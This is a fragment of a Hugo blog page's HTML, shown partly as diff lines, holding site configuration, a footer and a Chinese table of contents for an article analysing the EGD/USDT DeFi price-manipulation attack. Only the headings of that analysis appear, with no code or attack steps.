experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#背景介绍">背景介绍</a></li>
+    <li><a href="#code-review">Code Review</a>
+      <ul>
+        <li><a href="#逻辑合约">逻辑合约</a></li>
+        <li><a href="#漏洞代码">漏洞代码</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击过程">攻击过程</a>
+      <ul>
+        <li><a href="#操纵egdusdt的价格-让egd非常便宜">操纵EGD/USDT的价格, 让EGD非常便宜</a></li>
+        <li><a href="#质押usdt获取egd奖励">质押USDT获取EGD奖励</a></li>
+        <li><a href="#在操纵价格后获取egd奖励">在操纵价格后获取EGD奖励</a></li>
+        <li><a href="#将获利兑换为usdt进行套现">将获利兑换为USDT进行套现</a></li>
+      </ul>
+    </li>
+    <li><a href="#相关">相关</a>
+      <ul>
+        <li><a href="#ethernaut-挑战">Ethernaut 挑战</a></li>
+        <li><a href="#预言机安全性">预言机安全性</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.5"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="目录"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/da411beba49a75ba9cec79262c2691c9.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
 </html>
